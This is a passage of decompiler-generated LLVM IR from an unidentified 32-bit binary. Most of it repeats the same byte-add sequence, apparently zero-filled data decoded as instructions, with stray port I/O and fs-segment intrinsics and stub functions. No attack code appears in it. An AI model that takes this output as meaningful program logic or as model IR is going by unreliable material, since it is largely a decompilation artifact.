  %202 = load i32, i32* %eax, align 4
  %203 = inttoptr i32 %202 to i8*, !insn.addr !368
  %204 = load i8, i8* %203, align 1, !insn.addr !368
  %205 = trunc i32 %202 to i8, !insn.addr !368
  %206 = add i8 %204, %205, !insn.addr !368
  store i8 %206, i8* %203, align 1, !insn.addr !368
  %207 = load i32, i32* %eax, align 4
  %208 = inttoptr i32 %207 to i8*, !insn.addr !369
  %209 = load i8, i8* %208, align 1, !insn.addr !369
  %210 = trunc i32 %207 to i8, !insn.addr !369
  %211 = add i8 %209, %210, !insn.addr !369
  store i8 %211, i8* %208, align 1, !insn.addr !369
  %212 = load i32, i32* %eax, align 4
  %213 = inttoptr i32 %212 to i8*, !insn.addr !370
  %214 = load i8, i8* %213, align 1, !insn.addr !370
  %215 = trunc i32 %212 to i8, !insn.addr !370
  %216 = add i8 %214, %215, !insn.addr !370
  store i8 %216, i8* %213, align 1, !insn.addr !370
  %217 = load i32, i32* %eax, align 4
  %218 = inttoptr i32 %217 to i8*, !insn.addr !371
  %219 = load i8, i8* %218, align 1, !insn.addr !371
  %220 = trunc i32 %217 to i8, !insn.addr !371
  %221 = add i8 %219, %220, !insn.addr !371
  store i8 %221, i8* %218, align 1, !insn.addr !371
  %222 = load i32, i32* %eax, align 4, !insn.addr !372
  %223 = add i32 %222, 112, !insn.addr !372
  %224 = inttoptr i32 %223 to i8*, !insn.addr !372
  %225 = load i8, i8* %224, align 1, !insn.addr !372
  %226 = udiv i32 %2, 256, !insn.addr !372
  %227 = trunc i32 %226 to i8, !insn.addr !372
  %228 = add i8 %225, %227, !insn.addr !372
  %229 = icmp eq i8 %228, 0, !insn.addr !372
  store i8 %228, i8* %224, align 1, !insn.addr !372
  br i1 %229, label %dec_label_pc_404949, label %dec_label_pc_4048e0, !insn.addr !373

dec_label_pc_4048e0:                              ; preds = %dec_label_pc_40489e
  store i32 116, i32* %stack_var_-4, align 4, !insn.addr !374
  %230 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !374
  %231 = add i32 %156, 106, !insn.addr !375
  %232 = inttoptr i32 %231 to i32*, !insn.addr !375
  %233 = load i32, i32* %232, align 4, !insn.addr !375
  %234 = mul i32 %233, 98, !insn.addr !375
  %235 = load i32, i32* %eax, align 4
  %236 = inttoptr i32 %235 to i8*, !insn.addr !376
  %237 = load i8, i8* %236, align 1, !insn.addr !376
  %238 = trunc i32 %235 to i8, !insn.addr !376
  %239 = add i8 %237, %238, !insn.addr !376
  store i8 %239, i8* %236, align 1, !insn.addr !376
  %240 = load i32, i32* %eax, align 4
  %241 = inttoptr i32 %240 to i8*, !insn.addr !377
  %242 = load i8, i8* %241, align 1, !insn.addr !377
  %243 = trunc i32 %240 to i8, !insn.addr !377
  %244 = add i8 %242, %243, !insn.addr !377
  store i8 %244, i8* %241, align 1, !insn.addr !377
  %245 = load i32, i32* %eax, align 4
  %246 = inttoptr i32 %245 to i8*, !insn.addr !378
  %247 = load i8, i8* %246, align 1, !insn.addr !378
  %248 = trunc i32 %245 to i8, !insn.addr !378
  %249 = add i8 %247, %248, !insn.addr !378
  store i8 %249, i8* %246, align 1, !insn.addr !378
  %250 = load i32, i32* %eax, align 4
  %251 = inttoptr i32 %250 to i8*, !insn.addr !379
  %252 = load i8, i8* %251, align 1, !insn.addr !379
  %253 = trunc i32 %250 to i8, !insn.addr !379
  %254 = add i8 %252, %253, !insn.addr !379
  store i8 %254, i8* %251, align 1, !insn.addr !379
  %255 = load i32, i32* %eax, align 4
  %256 = inttoptr i32 %255 to i8*, !insn.addr !380
  %257 = load i8, i8* %256, align 1, !insn.addr !380
  %258 = trunc i32 %255 to i8, !insn.addr !380
  %259 = add i8 %257, %258, !insn.addr !380
  store i8 %259, i8* %256, align 1, !insn.addr !380
  %260 = load i32, i32* %eax, align 4
  %261 = inttoptr i32 %260 to i8*, !insn.addr !381
  %262 = load i8, i8* %261, align 1, !insn.addr !381
  %263 = trunc i32 %260 to i8, !insn.addr !381
  %264 = add i8 %262, %263, !insn.addr !381
  store i8 %264, i8* %261, align 1, !insn.addr !381
  %265 = load i32, i32* %eax, align 4
  %266 = inttoptr i32 %265 to i8*, !insn.addr !382
  %267 = load i8, i8* %266, align 1, !insn.addr !382
  %268 = trunc i32 %265 to i8, !insn.addr !382
  %269 = add i8 %267, %268, !insn.addr !382
  store i8 %269, i8* %266, align 1, !insn.addr !382
  %270 = load i32, i32* %eax, align 4
  %271 = inttoptr i32 %270 to i8*, !insn.addr !383
  %272 = load i8, i8* %271, align 1, !insn.addr !383
  %273 = trunc i32 %270 to i8, !insn.addr !383
  %274 = add i8 %272, %273, !insn.addr !383
  store i8 %274, i8* %271, align 1, !insn.addr !383
  %275 = load i32, i32* %eax, align 4
  %276 = inttoptr i32 %275 to i8*, !insn.addr !384
  %277 = load i8, i8* %276, align 1, !insn.addr !384
  %278 = trunc i32 %275 to i8, !insn.addr !384
  %279 = add i8 %277, %278, !insn.addr !384
  store i8 %279, i8* %276, align 1, !insn.addr !384
  %280 = load i32, i32* %eax, align 4
  %281 = inttoptr i32 %280 to i8*, !insn.addr !385
  %282 = load i8, i8* %281, align 1, !insn.addr !385
  %283 = trunc i32 %280 to i8, !insn.addr !385
  %284 = add i8 %282, %283, !insn.addr !385
  store i8 %284, i8* %281, align 1, !insn.addr !385
  %285 = load i32, i32* %eax, align 4
  %286 = inttoptr i32 %285 to i8*, !insn.addr !386
  %287 = load i8, i8* %286, align 1, !insn.addr !386
  %288 = trunc i32 %285 to i8, !insn.addr !386
  %289 = add i8 %287, %288, !insn.addr !386
  store i8 %289, i8* %286, align 1, !insn.addr !386
  %290 = load i32, i32* %eax, align 4
  %291 = inttoptr i32 %290 to i8*, !insn.addr !387
  %292 = load i8, i8* %291, align 1, !insn.addr !387
  %293 = trunc i32 %290 to i8, !insn.addr !387
  %294 = add i8 %292, %293, !insn.addr !387
  store i8 %294, i8* %291, align 1, !insn.addr !387
  %295 = load i32, i32* %eax, align 4
  %296 = inttoptr i32 %295 to i8*, !insn.addr !388
  %297 = load i8, i8* %296, align 1, !insn.addr !388
  %298 = trunc i32 %295 to i8, !insn.addr !388
  %299 = add i8 %297, %298, !insn.addr !388
  store i8 %299, i8* %296, align 1, !insn.addr !388
  %300 = load i32, i32* %eax, align 4
  %301 = inttoptr i32 %300 to i8*, !insn.addr !389
  %302 = load i8, i8* %301, align 1, !insn.addr !389
  %303 = trunc i32 %300 to i8, !insn.addr !389
  %304 = add i8 %302, %303, !insn.addr !389
  store i8 %304, i8* %301, align 1, !insn.addr !389
  %305 = load i32, i32* %eax, align 4
  %306 = inttoptr i32 %305 to i8*, !insn.addr !390
  %307 = load i8, i8* %306, align 1, !insn.addr !390
  %308 = trunc i32 %305 to i8, !insn.addr !390
  %309 = add i8 %307, %308, !insn.addr !390
  store i8 %309, i8* %306, align 1, !insn.addr !390
  store i32 %230, i32* %esp.0.reg2mem, !insn.addr !390
  store i32 %234, i32* %esi.2.reg2mem, !insn.addr !390
  br label %dec_label_pc_404907, !insn.addr !390

dec_label_pc_404907:                              ; preds = %dec_label_pc_4048e0, %dec_label_pc_404891
  %esi.2.reload = load i32, i32* %esi.2.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %310 = load i32, i32* %eax, align 4
  %311 = inttoptr i32 %310 to i8*, !insn.addr !391
  %312 = load i8, i8* %311, align 1, !insn.addr !391
  %313 = trunc i32 %310 to i8, !insn.addr !391
  %314 = add i8 %312, %313, !insn.addr !391
  store i8 %314, i8* %311, align 1, !insn.addr !391
  %315 = load i32, i32* %eax, align 4
  %316 = inttoptr i32 %315 to i8*, !insn.addr !392
  %317 = load i8, i8* %316, align 1, !insn.addr !392
  %318 = trunc i32 %315 to i8, !insn.addr !392
  %319 = add i8 %317, %318, !insn.addr !392
  store i8 %319, i8* %316, align 1, !insn.addr !392
  %320 = load i32, i32* %eax, align 4
  %321 = inttoptr i32 %320 to i8*, !insn.addr !393
  %322 = load i8, i8* %321, align 1, !insn.addr !393
  %323 = trunc i32 %320 to i8, !insn.addr !393
  %324 = add i8 %322, %323, !insn.addr !393
  store i8 %324, i8* %321, align 1, !insn.addr !393
  %325 = load i32, i32* %eax, align 4
  %326 = inttoptr i32 %325 to i8*, !insn.addr !394
  %327 = load i8, i8* %326, align 1, !insn.addr !394
  %328 = trunc i32 %325 to i8, !insn.addr !394
  %329 = add i8 %327, %328, !insn.addr !394
  store i8 %329, i8* %326, align 1, !insn.addr !394
  %330 = load i32, i32* %eax, align 4
  %331 = inttoptr i32 %330 to i8*, !insn.addr !395
  %332 = load i8, i8* %331, align 1, !insn.addr !395
  %333 = trunc i32 %330 to i8, !insn.addr !395
  %334 = add i8 %332, %333, !insn.addr !395
  store i8 %334, i8* %331, align 1, !insn.addr !395
  %335 = load i32, i32* %eax, align 4
  %336 = inttoptr i32 %335 to i8*, !insn.addr !396
  %337 = load i8, i8* %336, align 1, !insn.addr !396
  %338 = trunc i32 %335 to i8, !insn.addr !396
  %339 = add i8 %337, %338, !insn.addr !396
  store i8 %339, i8* %336, align 1, !insn.addr !396
  %340 = load i32, i32* %eax, align 4
  %341 = inttoptr i32 %340 to i8*, !insn.addr !397
  %342 = load i8, i8* %341, align 1, !insn.addr !397
  %343 = trunc i32 %340 to i8, !insn.addr !397
  %344 = add i8 %342, %343, !insn.addr !397
  store i8 %344, i8* %341, align 1, !insn.addr !397
  %345 = load i32, i32* %eax, align 4
  %346 = inttoptr i32 %345 to i8*, !insn.addr !398
  %347 = load i8, i8* %346, align 1, !insn.addr !398
  %348 = trunc i32 %345 to i8, !insn.addr !398
  %349 = add i8 %347, %348, !insn.addr !398
  store i8 %349, i8* %346, align 1, !insn.addr !398
  %350 = load i32, i32* %eax, align 4
  %351 = inttoptr i32 %350 to i8*, !insn.addr !399
  %352 = load i8, i8* %351, align 1, !insn.addr !399
  %353 = trunc i32 %350 to i8, !insn.addr !399
  %354 = add i8 %352, %353, !insn.addr !399
  store i8 %354, i8* %351, align 1, !insn.addr !399
  %355 = load i32, i32* %eax, align 4
  %356 = inttoptr i32 %355 to i8*, !insn.addr !400
  %357 = load i8, i8* %356, align 1, !insn.addr !400
  %358 = trunc i32 %355 to i8, !insn.addr !400
  %359 = add i8 %357, %358, !insn.addr !400
  store i8 %359, i8* %356, align 1, !insn.addr !400
  %360 = load i32, i32* %eax, align 4
  %361 = inttoptr i32 %360 to i8*, !insn.addr !401
  %362 = load i8, i8* %361, align 1, !insn.addr !401
  %363 = trunc i32 %360 to i8, !insn.addr !401
  %364 = add i8 %362, %363, !insn.addr !401
  store i8 %364, i8* %361, align 1, !insn.addr !401
  %365 = load i32, i32* %eax, align 4
  %366 = inttoptr i32 %365 to i8*, !insn.addr !402
  %367 = load i8, i8* %366, align 1, !insn.addr !402
  %368 = trunc i32 %365 to i8, !insn.addr !402
  %369 = add i8 %367, %368, !insn.addr !402
  store i8 %369, i8* %366, align 1, !insn.addr !402
  %370 = add i32 %133, 117, !insn.addr !403
  %371 = add i32 %370, %esi.2.reload, !insn.addr !403
  %372 = inttoptr i32 %371 to i8*, !insn.addr !403
  %373 = load i8, i8* %372, align 1, !insn.addr !403
  %374 = udiv i32 %3, 256, !insn.addr !403
  %375 = trunc i32 %374 to i8, !insn.addr !403
  %376 = add i8 %373, %375, !insn.addr !403
  %377 = xor i8 %376, %373, !insn.addr !403
  %378 = xor i8 %376, %375, !insn.addr !403
  %379 = and i8 %377, %378, !insn.addr !403
  %380 = icmp slt i8 %379, 0, !insn.addr !403
  store i8 %376, i8* %372, align 1, !insn.addr !403
  %381 = icmp eq i1 %380, false, !insn.addr !404
  br i1 %381, label %dec_label_pc_404962, label %dec_label_pc_404925, !insn.addr !404

dec_label_pc_404925:                              ; preds = %dec_label_pc_404907
  %382 = xor i32 %esi.2.reload, %3, !insn.addr !405
  %383 = call i32 @__readfsdword(i32 %382), !insn.addr !406
  call void @__asm_outsd(i16 %145, i32 %383), !insn.addr !406
  %384 = load i32, i32* %eax, align 4
  %385 = inttoptr i32 %384 to i8*, !insn.addr !407
  %386 = load i8, i8* %385, align 1, !insn.addr !407
  %387 = trunc i32 %384 to i8, !insn.addr !407
  %388 = add i8 %386, %387, !insn.addr !407
  store i8 %388, i8* %385, align 1, !insn.addr !407
  %389 = load i32, i32* %eax, align 4
  %390 = inttoptr i32 %389 to i8*, !insn.addr !408
  %391 = load i8, i8* %390, align 1, !insn.addr !408
  %392 = trunc i32 %389 to i8, !insn.addr !408
  %393 = add i8 %391, %392, !insn.addr !408
  store i8 %393, i8* %390, align 1, !insn.addr !408
  %394 = load i32, i32* %eax, align 4
  %395 = inttoptr i32 %394 to i8*, !insn.addr !409
  %396 = load i8, i8* %395, align 1, !insn.addr !409
  %397 = trunc i32 %394 to i8, !insn.addr !409
  %398 = add i8 %396, %397, !insn.addr !409
  store i8 %398, i8* %395, align 1, !insn.addr !409
  %399 = load i32, i32* %eax, align 4
  %400 = inttoptr i32 %399 to i8*, !insn.addr !410
  %401 = load i8, i8* %400, align 1, !insn.addr !410
  %402 = trunc i32 %399 to i8, !insn.addr !410
  %403 = add i8 %401, %402, !insn.addr !410
  store i8 %403, i8* %400, align 1, !insn.addr !410
  %404 = load i32, i32* %eax, align 4
  %405 = inttoptr i32 %404 to i8*, !insn.addr !411
  %406 = load i8, i8* %405, align 1, !insn.addr !411
  %407 = trunc i32 %404 to i8, !insn.addr !411
  %408 = add i8 %406, %407, !insn.addr !411
  store i8 %408, i8* %405, align 1, !insn.addr !411
  %409 = load i32, i32* %eax, align 4
  %410 = inttoptr i32 %409 to i8*, !insn.addr !412
  %411 = load i8, i8* %410, align 1, !insn.addr !412
  %412 = trunc i32 %409 to i8, !insn.addr !412
  %413 = add i8 %411, %412, !insn.addr !412
  store i8 %413, i8* %410, align 1, !insn.addr !412
  %414 = load i32, i32* %eax, align 4
  %415 = inttoptr i32 %414 to i8*, !insn.addr !413
  %416 = load i8, i8* %415, align 1, !insn.addr !413
  %417 = trunc i32 %414 to i8, !insn.addr !413
  %418 = add i8 %416, %417, !insn.addr !413
  store i8 %418, i8* %415, align 1, !insn.addr !413
  %419 = load i32, i32* %eax, align 4
  %420 = inttoptr i32 %419 to i8*, !insn.addr !414
  %421 = load i8, i8* %420, align 1, !insn.addr !414
  %422 = trunc i32 %419 to i8, !insn.addr !414
  %423 = add i8 %421, %422, !insn.addr !414
  store i8 %423, i8* %420, align 1, !insn.addr !414
  %424 = load i32, i32* %eax, align 4
  %425 = inttoptr i32 %424 to i8*, !insn.addr !415
  %426 = load i8, i8* %425, align 1, !insn.addr !415
  %427 = trunc i32 %424 to i8, !insn.addr !415
  %428 = add i8 %426, %427, !insn.addr !415
  store i8 %428, i8* %425, align 1, !insn.addr !415
  %429 = load i32, i32* %eax, align 4
  %430 = inttoptr i32 %429 to i8*, !insn.addr !416
  %431 = load i8, i8* %430, align 1, !insn.addr !416
  %432 = trunc i32 %429 to i8, !insn.addr !416
  %433 = add i8 %431, %432, !insn.addr !416
  store i8 %433, i8* %430, align 1, !insn.addr !416
  %434 = load i32, i32* %eax, align 4
  %435 = inttoptr i32 %434 to i8*, !insn.addr !417
  %436 = load i8, i8* %435, align 1, !insn.addr !417
  %437 = trunc i32 %434 to i8, !insn.addr !417
  %438 = add i8 %436, %437, !insn.addr !417
  store i8 %438, i8* %435, align 1, !insn.addr !417
  %439 = load i32, i32* %eax, align 4
  %440 = inttoptr i32 %439 to i8*, !insn.addr !418
  %441 = load i8, i8* %440, align 1, !insn.addr !418
  %442 = trunc i32 %439 to i8, !insn.addr !418
  %443 = add i8 %441, %442, !insn.addr !418
  store i8 %443, i8* %440, align 1, !insn.addr !418
  %444 = load i32, i32* %eax, align 4
  %445 = inttoptr i32 %444 to i8*, !insn.addr !419
  %446 = load i8, i8* %445, align 1, !insn.addr !419
  %447 = trunc i32 %444 to i8, !insn.addr !419
  %448 = add i8 %446, %447, !insn.addr !419
  store i8 %448, i8* %445, align 1, !insn.addr !419
  %449 = load i32, i32* %eax, align 4, !insn.addr !419
  ret i32 %449, !insn.addr !419

dec_label_pc_404949:                              ; preds = %dec_label_pc_40489e
  %450 = load i32, i32* %eax, align 4
  %451 = inttoptr i32 %450 to i8*, !insn.addr !420
  %452 = load i8, i8* %451, align 1, !insn.addr !420
  %453 = trunc i32 %450 to i8, !insn.addr !420
  %454 = add i8 %452, %453, !insn.addr !420
  store i8 %454, i8* %451, align 1, !insn.addr !420
  %455 = load i32, i32* %eax, align 4
  %456 = inttoptr i32 %455 to i8*, !insn.addr !421
  %457 = load i8, i8* %456, align 1, !insn.addr !421
  %458 = trunc i32 %455 to i8, !insn.addr !421
  %459 = add i8 %457, %458, !insn.addr !421
  store i8 %459, i8* %456, align 1, !insn.addr !421
  %460 = load i32, i32* %eax, align 4
  %461 = inttoptr i32 %460 to i8*, !insn.addr !422
  %462 = load i8, i8* %461, align 1, !insn.addr !422
  %463 = trunc i32 %460 to i8, !insn.addr !422
  %464 = add i8 %462, %463, !insn.addr !422
  store i8 %464, i8* %461, align 1, !insn.addr !422
  %465 = load i32, i32* %eax, align 4
  %466 = inttoptr i32 %465 to i8*, !insn.addr !423
  %467 = load i8, i8* %466, align 1, !insn.addr !423
  %468 = trunc i32 %465 to i8, !insn.addr !423
  %469 = add i8 %467, %468, !insn.addr !423
  store i8 %469, i8* %466, align 1, !insn.addr !423
  %470 = load i32, i32* %eax, align 4
  %471 = inttoptr i32 %470 to i8*, !insn.addr !424
  %472 = load i8, i8* %471, align 1, !insn.addr !424
  %473 = trunc i32 %470 to i8, !insn.addr !424
  %474 = add i8 %472, %473, !insn.addr !424
  store i8 %474, i8* %471, align 1, !insn.addr !424
  %475 = load i32, i32* %eax, align 4
  %476 = inttoptr i32 %475 to i8*, !insn.addr !425
  %477 = load i8, i8* %476, align 1, !insn.addr !425
  %478 = trunc i32 %475 to i8, !insn.addr !425
  %479 = add i8 %477, %478, !insn.addr !425
  store i8 %479, i8* %476, align 1, !insn.addr !425
  %480 = load i32, i32* %eax, align 4
  %481 = inttoptr i32 %480 to i8*, !insn.addr !426
  %482 = load i8, i8* %481, align 1, !insn.addr !426
  %483 = trunc i32 %480 to i8, !insn.addr !426
  %484 = add i8 %482, %483, !insn.addr !426
  store i8 %484, i8* %481, align 1, !insn.addr !426
  %485 = load i32, i32* %eax, align 4
  %486 = inttoptr i32 %485 to i8*, !insn.addr !427
  %487 = load i8, i8* %486, align 1, !insn.addr !427
  %488 = trunc i32 %485 to i8, !insn.addr !427
  %489 = add i8 %487, %488, !insn.addr !427
  store i8 %489, i8* %486, align 1, !insn.addr !427
  %490 = load i32, i32* %eax, align 4
  %491 = inttoptr i32 %490 to i8*, !insn.addr !428
  %492 = load i8, i8* %491, align 1, !insn.addr !428
  %493 = trunc i32 %490 to i8, !insn.addr !428
  %494 = add i8 %492, %493, !insn.addr !428
  store i8 %494, i8* %491, align 1, !insn.addr !428
  %495 = load i32, i32* %eax, align 4
  %496 = inttoptr i32 %495 to i8*, !insn.addr !429
  %497 = load i8, i8* %496, align 1, !insn.addr !429
  %498 = trunc i32 %495 to i8, !insn.addr !429
  %499 = add i8 %497, %498, !insn.addr !429
  store i8 %499, i8* %496, align 1, !insn.addr !429
  %500 = load i32, i32* %eax, align 4
  %501 = inttoptr i32 %500 to i8*, !insn.addr !430
  %502 = load i8, i8* %501, align 1, !insn.addr !430
  %503 = trunc i32 %500 to i8, !insn.addr !430
  %504 = add i8 %502, %503, !insn.addr !430
  store i8 %504, i8* %501, align 1, !insn.addr !430
  %505 = load i32, i32* %eax, align 4
  %506 = inttoptr i32 %505 to i8*, !insn.addr !431
  %507 = load i8, i8* %506, align 1, !insn.addr !431
  %508 = trunc i32 %505 to i8, !insn.addr !431
  %509 = add i8 %507, %508, !insn.addr !431
  store i8 %509, i8* %506, align 1, !insn.addr !431
  %510 = load i32, i32* %eax, align 4, !insn.addr !431
  ret i32 %510, !insn.addr !431

dec_label_pc_404962:                              ; preds = %dec_label_pc_404907
  %511 = load i32, i32* %eax, align 4
  %512 = inttoptr i32 %511 to i8*, !insn.addr !432
  %513 = load i8, i8* %512, align 1, !insn.addr !432
  %514 = trunc i32 %511 to i8, !insn.addr !432
  %515 = add i8 %513, %514, !insn.addr !432
  %516 = icmp slt i8 %515, 0, !insn.addr !432
  store i8 %515, i8* %512, align 1, !insn.addr !432
  br i1 %516, label %dec_label_pc_4049ac, label %dec_label_pc_40496f, !insn.addr !433

dec_label_pc_40496f:                              ; preds = %dec_label_pc_404962
  %517 = load i32, i32* %7, align 4, !insn.addr !434
  %518 = mul i32 %517, 808467313, !insn.addr !434
  %519 = xor i32 %518, %3, !insn.addr !435
  %520 = call i32 @__readfsdword(i32 %519), !insn.addr !436
  call void @__asm_outsd(i16 %145, i32 %520), !insn.addr !436
  %521 = load i32, i32* %eax, align 4
  %522 = inttoptr i32 %521 to i8*, !insn.addr !437
  %523 = load i8, i8* %522, align 1, !insn.addr !437
  %524 = trunc i32 %521 to i8, !insn.addr !437
  %525 = add i8 %523, %524, !insn.addr !437
  store i8 %525, i8* %522, align 1, !insn.addr !437
  %526 = load i32, i32* %eax, align 4
  %527 = inttoptr i32 %526 to i8*, !insn.addr !438
  %528 = load i8, i8* %527, align 1, !insn.addr !438
  %529 = trunc i32 %526 to i8, !insn.addr !438
  %530 = add i8 %528, %529, !insn.addr !438
  store i8 %530, i8* %527, align 1, !insn.addr !438
  %531 = load i32, i32* %eax, align 4
  %532 = inttoptr i32 %531 to i8*, !insn.addr !439
  %533 = load i8, i8* %532, align 1, !insn.addr !439
  %534 = trunc i32 %531 to i8, !insn.addr !439
  %535 = add i8 %533, %534, !insn.addr !439
  store i8 %535, i8* %532, align 1, !insn.addr !439
  %536 = load i32, i32* %eax, align 4
  %537 = inttoptr i32 %536 to i8*, !insn.addr !440
  %538 = load i8, i8* %537, align 1, !insn.addr !440
  %539 = trunc i32 %536 to i8, !insn.addr !440
  %540 = add i8 %538, %539, !insn.addr !440
  store i8 %540, i8* %537, align 1, !insn.addr !440
  %541 = load i32, i32* %eax, align 4
  %542 = inttoptr i32 %541 to i8*, !insn.addr !441
  %543 = load i8, i8* %542, align 1, !insn.addr !441
  %544 = trunc i32 %541 to i8, !insn.addr !441
  %545 = add i8 %543, %544, !insn.addr !441
  store i8 %545, i8* %542, align 1, !insn.addr !441
  %546 = load i32, i32* %eax, align 4
  %547 = inttoptr i32 %546 to i8*, !insn.addr !442
  %548 = load i8, i8* %547, align 1, !insn.addr !442
  %549 = trunc i32 %546 to i8, !insn.addr !442
  %550 = add i8 %548, %549, !insn.addr !442
  store i8 %550, i8* %547, align 1, !insn.addr !442
  %551 = load i32, i32* %eax, align 4
  %552 = inttoptr i32 %551 to i8*, !insn.addr !443
  %553 = load i8, i8* %552, align 1, !insn.addr !443
  %554 = trunc i32 %551 to i8, !insn.addr !443
  %555 = add i8 %553, %554, !insn.addr !443
  store i8 %555, i8* %552, align 1, !insn.addr !443
  %556 = load i32, i32* %eax, align 4
  %557 = inttoptr i32 %556 to i8*, !insn.addr !444
  %558 = load i8, i8* %557, align 1, !insn.addr !444
  %559 = trunc i32 %556 to i8, !insn.addr !444
  %560 = add i8 %558, %559, !insn.addr !444
  store i8 %560, i8* %557, align 1, !insn.addr !444
  %561 = load i32, i32* %eax, align 4
  %562 = inttoptr i32 %561 to i8*, !insn.addr !445
  %563 = load i8, i8* %562, align 1, !insn.addr !445
  %564 = trunc i32 %561 to i8, !insn.addr !445
  %565 = add i8 %563, %564, !insn.addr !445
  store i8 %565, i8* %562, align 1, !insn.addr !445
  %566 = load i32, i32* %eax, align 4
  %567 = inttoptr i32 %566 to i8*, !insn.addr !446
  %568 = load i8, i8* %567, align 1, !insn.addr !446
  %569 = trunc i32 %566 to i8, !insn.addr !446
  %570 = add i8 %568, %569, !insn.addr !446
  store i8 %570, i8* %567, align 1, !insn.addr !446
  %571 = load i32, i32* %eax, align 4
  %572 = inttoptr i32 %571 to i8*, !insn.addr !447
  %573 = load i8, i8* %572, align 1, !insn.addr !447
  %574 = trunc i32 %571 to i8, !insn.addr !447
  %575 = add i8 %573, %574, !insn.addr !447
  store i8 %575, i8* %572, align 1, !insn.addr !447
  %576 = load i32, i32* %eax, align 4
  %577 = inttoptr i32 %576 to i8*, !insn.addr !448
  %578 = load i8, i8* %577, align 1, !insn.addr !448
  %579 = trunc i32 %576 to i8, !insn.addr !448
  %580 = add i8 %578, %579, !insn.addr !448
  store i8 %580, i8* %577, align 1, !insn.addr !448
  %581 = load i32, i32* %eax, align 4
  %582 = inttoptr i32 %581 to i8*, !insn.addr !449
  %583 = load i8, i8* %582, align 1, !insn.addr !449
  %584 = trunc i32 %581 to i8, !insn.addr !449
  %585 = add i8 %583, %584, !insn.addr !449
  store i8 %585, i8* %582, align 1, !insn.addr !449
  %586 = load i32, i32* %eax, align 4
  %587 = inttoptr i32 %586 to i8*, !insn.addr !450
  %588 = load i8, i8* %587, align 1, !insn.addr !450
  %589 = trunc i32 %586 to i8, !insn.addr !450
  %590 = add i8 %588, %589, !insn.addr !450
  store i8 %590, i8* %587, align 1, !insn.addr !450
  %591 = load i32, i32* %eax, align 4
  %592 = inttoptr i32 %591 to i8*, !insn.addr !451
  %593 = load i8, i8* %592, align 1, !insn.addr !451
  %594 = trunc i32 %591 to i8, !insn.addr !451
  %595 = add i8 %593, %594, !insn.addr !451
  store i8 %595, i8* %592, align 1, !insn.addr !451
  %596 = load i32, i32* %eax, align 4
  %597 = inttoptr i32 %596 to i8*, !insn.addr !452
  %598 = load i8, i8* %597, align 1, !insn.addr !452
  %599 = trunc i32 %596 to i8, !insn.addr !452
  %600 = add i8 %598, %599, !insn.addr !452
  store i8 %600, i8* %597, align 1, !insn.addr !452
  %601 = load i32, i32* %eax, align 4
  %602 = inttoptr i32 %601 to i8*, !insn.addr !453
  %603 = load i8, i8* %602, align 1, !insn.addr !453
  %604 = trunc i32 %601 to i8, !insn.addr !453
  %605 = add i8 %603, %604, !insn.addr !453
  store i8 %605, i8* %602, align 1, !insn.addr !453
  %606 = load i32, i32* %eax, align 4
  %607 = inttoptr i32 %606 to i8*, !insn.addr !454
  %608 = load i8, i8* %607, align 1, !insn.addr !454
  %609 = trunc i32 %606 to i8, !insn.addr !454
  %610 = add i8 %608, %609, !insn.addr !454
  store i8 %610, i8* %607, align 1, !insn.addr !454
  %611 = load i32, i32* %eax, align 4
  %612 = inttoptr i32 %611 to i8*, !insn.addr !455
  %613 = load i8, i8* %612, align 1, !insn.addr !455
  %614 = trunc i32 %611 to i8, !insn.addr !455
  %615 = add i8 %613, %614, !insn.addr !455
  store i8 %615, i8* %612, align 1, !insn.addr !455
  %616 = load i32, i32* %eax, align 4
  %617 = inttoptr i32 %616 to i8*, !insn.addr !456
  %618 = load i8, i8* %617, align 1, !insn.addr !456
  %619 = trunc i32 %616 to i8, !insn.addr !456
  %620 = add i8 %618, %619, !insn.addr !456
  store i8 %620, i8* %617, align 1, !insn.addr !456
  %621 = add i32 %1, -117, !insn.addr !457
  %622 = inttoptr i32 %621 to i8*, !insn.addr !457
  %623 = load i8, i8* %622, align 1, !insn.addr !457
  %624 = trunc i32 %3 to i8, !insn.addr !457
  %625 = add i8 %623, %624, !insn.addr !457
  store i8 %625, i8* %622, align 1, !insn.addr !457
  %626 = call i8 @__asm_in(i16 %145), !insn.addr !458
  %627 = sext i8 %626 to i32, !insn.addr !458
  %628 = load i32, i32* %eax, align 4, !insn.addr !458
  %629 = and i32 %628, -256, !insn.addr !458
  %630 = or i32 %629, %627, !insn.addr !458
  ret i32 %630, !insn.addr !458

dec_label_pc_4049ac:                              ; preds = %dec_label_pc_404962
  %631 = add i32 %1, 104, !insn.addr !459
  %632 = inttoptr i32 %631 to i8*, !insn.addr !459
  store i8 0, i8* %632, align 1, !insn.addr !459
  %633 = load i32, i32* %eax, align 4, !insn.addr !460
  %634 = add i32 %633, 1, !insn.addr !460
  %635 = mul i32 %0, 8, !insn.addr !461
  %636 = add i32 %0, 48, !insn.addr !461
  %637 = add i32 %636, %635, !insn.addr !461
  %638 = inttoptr i32 %637 to i8*, !insn.addr !461
  %639 = load i8, i8* %638, align 1, !insn.addr !461
  %640 = udiv i32 %634, 256, !insn.addr !461
  %641 = trunc i32 %640 to i8, !insn.addr !461
  %642 = add i8 %639, %641, !insn.addr !461
  store i8 %642, i8* %638, align 1, !insn.addr !461
  call void @__writefsdword(i32 %634, i32 %esp.0.reload), !insn.addr !462
  %643 = load i32, i32* @global_var_409688, align 4, !insn.addr !463
  %644 = add i32 %643, 1, !insn.addr !463
  store i32 %644, i32* @global_var_409688, align 4, !insn.addr !463
  %645 = load i32, i32* %stack_var_-4, align 4, !insn.addr !464
  call void @__writefsdword(i32 0, i32 %645), !insn.addr !465
  ret i32 0, !insn.addr !466
}

define i32 @function_4049cd() local_unnamed_addr {
dec_label_pc_4049cd:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !467
  ret i32 %0, !insn.addr !467
}

define i32 @function_4049d2() local_unnamed_addr {
dec_label_pc_4049d2:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !468
}

define i32 @function_4049d4(i32 %arg1) local_unnamed_addr {
dec_label_pc_4049d4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !469
}

define i32 @function_4049d8() local_unnamed_addr {
dec_label_pc_4049d8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409688, align 4, !insn.addr !470
  %2 = add i32 %1, -1, !insn.addr !470
  store i32 %2, i32* @global_var_409688, align 4, !insn.addr !470
  ret i32 %0, !insn.addr !471
}

